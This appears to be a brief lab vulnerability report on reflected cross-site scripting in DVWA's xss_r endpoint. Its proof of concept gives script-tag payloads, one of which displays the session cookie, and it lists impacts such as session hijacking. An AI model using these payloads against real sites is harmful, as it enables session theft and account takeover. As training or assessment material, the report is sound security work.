Reflected Cross-Site Scripting (XSS)
Severity

High

Vulnerability

The application reflects user input directly into the HTML response without sanitization or output encoding.

This allows arbitrary JavaScript execution inside the victim's browser.

Affected Endpoint
GET /dvwa/vulnerabilities/xss_r/

Parameter

name
Proof of Concept

Normal input

test

Response

Hello test

Malicious payload

<script>alert(1)</script>

Browser executes

alert(1)

Cookie theft payload

<script>alert(document.cookie)</script>

Result

security=low
PHPSESSID=...
Impact

An attacker may

Steal session cookies
Hijack authenticated sessions
Perform actions as another user
Deliver phishing pages
Execute malicious JavaScript
CWE
CWE-79
OWASP
A03:2021 Injection
